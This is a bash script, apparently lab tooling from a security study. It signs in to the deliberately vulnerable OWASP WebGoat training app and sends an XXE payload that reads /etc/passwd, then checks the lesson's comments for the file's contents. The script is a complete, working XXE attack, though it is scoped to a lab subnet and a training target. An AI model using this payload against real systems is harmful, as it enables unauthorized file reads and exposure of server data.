#!/usr/bin/env bash
# Pre-staged primitive: OWASP WebGoat XXE lesson (genuine http-webgoat).
#
# STANDARD PROCEDURE ONLY — WebGoat is a deliberately vulnerable *training* app, so
# this primitive follows WebGoat's OWN documented procedure with a plain HTTP client
# (curl): sign in with the study's training account (registering it through WebGoat's
# sign-up form the first time a freshly created container is seen), open the XXE lesson,
# submit the documented XXE payload -- an external entity resolving a local file, inside a
# lesson comment -- to the lesson's "Modern REST framework" assignment, and read the
# lesson's comment list back. No novel exploit is authored. Prints EXACTLY ONE JSON line
# the courier parses:
#     {"reached_and_executed": <bool>, "unauthorized_access": <bool>}
#
# HISTORY (2026-10-31). Until this revision the primitive could never report access, and
# WebGoat was recorded as reachable but never compromised ("obj_a-only"). Reading WebGoat
# 2023.8's own code (the pinned image's release) showed three defects in the primitive,
# not in WebGoat:
#   1. its training account ("mtd_<pid>", password "mtd_<pid>_pw") failed WebGoat's sign-up
#      validation -- usernames must match [a-z0-9-]{6,45} and passwords be 6-10 characters --
#      so it was never signed in;
#   2. it never opened the lesson, and WebGoat's progress tracker (LessonTrackerInterceptor)
#      throws on an assignment request while the session has no current lesson;
#   3. it looked for the file's contents in the assignment's reply, but WebGoat stores the
#      parsed comment and shows it only in the lesson's comment list (GET xxe/comments).
# See docs/primitive_tooling_integration.md ("WebGoat").
#
# reached_and_executed = signed in, and the XXE assignment accepted the payload.
# unauthorized_access  = the comment carrying THIS delivery's nonce came back holding the
#                        contents of /etc/passwd (a local file read on the server). The
#                        nonce keeps an earlier delivery's comment from ever counting.
#
# Usage: webgoat_xxe.sh <host> <port> <path>   (scoped to 172.31.66.0/24)
#        MTD_DEBUG=1 prints each step to stderr (stdout stays the one JSON line).
#        Every request is time-limited and the whole run stays within 95 s (see BUDGET_S).
set -uo pipefail

HOST="${1:?host}"; PORT="${2:?port}"; PATH_="${3:-/}"   # path: WebGoat's own routes are fixed
BASE="http://${HOST}:${PORT}/WebGoat"
CJAR="$(mktemp)"; trap 'rm -f "$CJAR"' EXIT
# The study's training account (WebGoat: username [a-z0-9-]{6,45}, password 6-10 characters).
USER_="mtd-attacker"; PASS_="mtdpass01"
NONCE="mtd-nonce-$$-$(date +%s%N)"

# The executor stops a primitive after 110 s (harness/live_targets.py: deliver_timeout_s 120,
# remote timeout 10 s earlier) and a primitive without a verdict is an infrastructure fault that
# ends the sequence. Every request therefore stays inside a 95-s budget, so a slow WebGoat
# still ends with a verdict. SECONDS counts from this script's start. (MTD_BUDGET_S shortens
# the budget for tests/test_webgoat_primitive.py; the executor never sets it.)
BUDGET_S="${MTD_BUDGET_S:-95}"
emit() { printf '{"reached_and_executed": %s, "unauthorized_access": %s}\n' "$1" "$2"; }
log() { if [ -n "${MTD_DEBUG:-}" ]; then printf 'webgoat_xxe: %s\n' "$*" >&2; fi; }
# Seconds a request may take: at most $1, and never past the budget (0 = none left).
allow() { local left=$(( BUDGET_S - SECONDS )); if [ "$left" -lt "$1" ]; then echo $(( left > 0 ? left : 0 )); else echo "$1"; fi; }
# HTTP status of one request taking at most $1 s, keeping the session in the cookie jar
# ("000" = no answer in time).
status() {
  local max; max="$(allow "$1")"; shift
  if [ "$max" -lt 1 ]; then printf '000'; return; fi
  curl -s -m "$max" -o /dev/null -w '%{http_code}' -b "$CJAR" -c "$CJAR" "$@"
}
# Opening the lesson page is also the sign-in check: WebGoat answers 200 to a signed-in
# session (and makes XXE its current lesson) and redirects anyone else to the login page.
open_lesson() { [ "$(status 15 "${BASE}/XXE.lesson")" = "200" ]; }

# 1. Reach WebGoat (the login page answers; seeds the session cookie).
CODE="$(status 15 "${BASE}/login")"
if [ "$CODE" != "200" ]; then log "login page answered ${CODE}"; emit false false; exit 0; fi

# 2. Sign in with the training account. A freshly created container has no accounts, so on
#    failure register it (WebGoat's sign-up signs the new account in), then open the lesson.
#    Sign-up gets up to 45 s: WebGoat creates the new user's lesson schema (CREATE SCHEMA and a
#    Flyway migration of every lesson's tables) before it answers.
CODE="$(status 15 --data "username=${USER_}&password=${PASS_}" "${BASE}/login")"
log "sign-in answered ${CODE}"
if ! open_lesson; then
  CODE="$(status 45 --data "username=${USER_}&password=${PASS_}&matchingPassword=${PASS_}&agree=agree" \
    "${BASE}/register.mvc")"
  log "sign-in did not hold; sign-up answered ${CODE}"
  if ! open_lesson; then log "not signed in; payload not sent"; emit false false; exit 0; fi
fi
log "signed in; XXE lesson open"

# 3. Submit the documented payload to the "Modern REST framework" assignment as XML: the
#    comment's text holds this delivery's nonce and an external entity resolving a local
#    file. No external callback (the node has no egress).
XXE='<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
XXE+="<comment><text>${NONCE} &xxe;</text></comment>"
CODE="$(status 15 -H 'Content-Type: application/xml' --data "$XXE" "${BASE}/xxe/content-type")"
log "assignment answered ${CODE}"
if [ "$CODE" != "200" ]; then emit false false; exit 0; fi

# 4. Read the lesson's comment list back and look for this delivery's comment: the entity's
#    expansion (the file's contents) follows the nonce inside the same JSON string.
MAX="$(allow 15)"; COMMENTS=""
if [ "$MAX" -ge 1 ]; then
  COMMENTS="$(curl -s -m "$MAX" -b "$CJAR" -c "$CJAR" "${BASE}/xxe/comments" 2>/dev/null)"
fi
if printf '%s' "$COMMENTS" | grep -o "${NONCE}[^\"]*" | grep -q 'root:[^:]*:0:0:'; then
  log "this delivery's comment holds /etc/passwd"; emit true true
else
  log "this delivery's comment does not hold the file"; emit true false
fi
